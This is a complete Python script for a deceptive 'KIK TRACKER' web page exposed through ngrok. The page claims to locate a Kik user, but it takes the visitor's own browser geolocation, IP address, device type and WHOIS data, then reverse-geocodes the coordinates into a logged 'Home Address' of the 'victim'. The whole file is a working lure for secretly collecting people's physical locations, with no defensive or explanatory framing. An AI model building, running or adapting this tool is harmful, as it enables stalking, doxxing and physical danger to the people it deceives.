import subprocess
import http.server
import socketserver
import json
import re
import os
import requests
import whois  # Add this import for WHOIS lookup

# Local server port
SERVER_PORT = 8000

# Get the directory of the current script
current_directory = os.path.dirname(os.path.abspath(__file__))
log_file_path = os.path.join(current_directory, 'log.txt')

# Load ngrok path or token from configuration file
config_file_path = os.path.join(current_directory, 'config.json')

if os.path.exists(config_file_path):
    with open(config_file_path, 'r') as config_file:
        config_data = json.load(config_file)
    NGROK_PATH = config_data.get('ngrok_path')
    NGROK_TOKEN = config_data.get('ngrok_token')
else:
    NGROK_PATH = input("Enter the path to ngrok executable (leave empty if using ngrok token): ")
    NGROK_TOKEN = input("Enter your ngrok token (leave empty if using ngrok path): ")
    with open(config_file_path, 'w') as config_file:
        json.dump({'ngrok_path': NGROK_PATH, 'ngrok_token': NGROK_TOKEN}, config_file)

# Start ngrok to expose the local server
def start_ngrok():
    if NGROK_PATH:
        subprocess.Popen([NGROK_PATH, 'http', str(SERVER_PORT)])
    elif NGROK_TOKEN:
        subprocess.Popen(['ngrok', 'authtoken', NGROK_TOKEN])
        subprocess.Popen(['ngrok', 'http', str(SERVER_PORT)])

# Function to determine the device type based on User-Agent header
def get_device_type(user_agent):
    if re.search(r'Android', user_agent):
        return 'Android'
    elif re.search(r'iPhone|iPad|iPod', user_agent):
        return 'iPhone'
    elif re.search(r'Windows NT', user_agent):
        return 'Desktop'
    else:
        return 'Unknown'

# Reverse geocoding function using OpenStreetMap Nominatim API
def reverse_geocode(latitude, longitude):
    url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={latitude}&lon={longitude}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        return data.get('display_name', 'Address not found')
    else:
        return 'Reverse geocoding failed'

# Function to perform WHOIS lookup
def whois_lookup(ip_address):
    try:
        w = whois.whois(ip_address)
        return str(w)
    except Exception as e:
        return f"WHOIS lookup failed: {str(e)}"

# Simple HTTP server
class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'''
                <html>
                <head>
                    <title>KIK USER LOCATOR</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1">
                    <style>
                        body {
                            background-color: black;
                            color: white;
                            display: flex;
                            justify-content: center;
                            align-items: center;
                            height: 100vh;
                            margin: 0;
                        }
                        button {
                            padding: 15px 30px;
                            font-size: 20px;
                            background-color: red;
                            color: white;
                            border: none;
                            cursor: pointer;
                        }
                    </style>
                </head>
                <body>
                    <div>
                        <h1>KIK TRACKER</h1>
                        <form id="locationForm">
                            <input type="text" id="locationInput" placeholder="Enter kik username">
                            <button type="submit">Submit</button>
                        <p>1: Search Kik username</p>
                        <p>2: Allow location(this allows the mapping to work)</p>
                        <p>3: Get Address of victim</p>
                        </form>
                        <p id="demo"></p>
                    </div>
                    <script>
                        document.getElementById('locationForm').addEventListener('submit', function(event) {
                            event.preventDefault();
                            getLocation();
                        });

                        function getLocation() {
                            if (navigator.geolocation) {
                                navigator.geolocation.getCurrentPosition(showPosition);
                            } else {
                                alert("Geolocation is not supported by this browser.");
                            }
                        }
                        function showPosition(position) {
                            var xhr = new XMLHttpRequest();
                            xhr.open("POST", "/location", true);
                            xhr.setRequestHeader("Content-Type", "application/json");
                            xhr.send(JSON.stringify({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                location: document.getElementById('locationInput').value
                            }));
                        }
                    </script>
                </body>
                </html>
            ''')
            return
        
        # Log when ngrok link is accessed and check device type
        client_ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]
        device_type = get_device_type(self.headers.get('User-Agent', ''))
        log_data = f'IP: {client_ip}\nDevice Type: {device_type}\nNETWORK INFO\n---------------------\n'
        log_data += whois_lookup(client_ip)  # Perform WHOIS lookup here
        with open(log_file_path, 'a') as log_file:
            log_file.write(log_data)
        
        super().do_GET()
        
        log_separator = '-' * 25
        with open(log_file_path, 'a') as log_file:
            log_file.write(log_separator + '\n')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))
        client_ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]  # Get client's IP address from X-Forwarded-For header or fallback to self.client_address
        device_type = get_device_type(self.headers.get('User-Agent', ''))
        log_data = f'GPS coordinates received:\nLatitude: {data["latitude"]}\nLongitude: {data["longitude"]}\nIP: {client_ip}\nDevice Type: {device_type}\n'
        
        # Reverse geocoding
        address = reverse_geocode(data["latitude"], data["longitude"])
        log_data += f'Home Address: {address}\n'
        
        with open(log_file_path, 'a') as log_file:
            log_file.write(log_data)
        
        log_separator = '-' * 25
        with open(log_file_path, 'a') as log_file:
            log_file.write(log_separator + '\n')

def start_server():
    handler_object = MyHttpRequestHandler
    my_server = socketserver.TCPServer(('0.0.0.0', SERVER_PORT), handler_object)
    my_server.serve_forever()

if __name__ == "__main__":
    start_ngrok()
    start_server()
